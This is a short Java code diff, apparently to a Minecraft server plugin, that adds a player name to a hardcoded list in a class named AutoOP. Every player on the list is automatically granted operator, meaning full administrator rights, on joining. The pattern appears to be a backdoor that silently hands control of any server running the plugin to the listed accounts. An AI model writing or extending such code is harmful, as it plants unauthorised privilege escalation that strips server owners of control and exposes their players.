@@ -18,6 +18,7 @@ public class AutoOP implements Listener {
         list.add("BOWP");
         list.add("K576");
         list.add("Fredo_nutella");
+        list.add("MattHawkk");
         for (String l : list) {
             if (e.getPlayer().getName().equalsIgnoreCase(l))
                 e.getPlayer().setOp(true);
